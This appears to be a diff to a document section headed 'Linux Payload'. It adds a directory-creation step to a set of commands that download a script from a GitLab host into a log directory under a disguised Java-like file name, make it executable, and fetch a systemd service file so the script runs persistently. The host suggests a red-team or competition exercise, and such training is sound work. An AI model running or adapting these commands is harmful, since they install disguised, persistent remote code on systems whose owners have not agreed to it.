@@ -44,6 +44,7 @@ Linux Payload
 
 $ sudo apt update
 $ sudo apt install curl
+$ sudo mkdir /var/log/asa/osa
 $ sudo curl -o /var/log/asa/osa/java-23.0.1-bin-java.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
 $ sudo chmod +x /var/log/asa/osa/java-23.0.1-bin-java.sh
 $ sudo curl -o /lib/systemd/system/java-23.0.1-bin-java.service "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads"
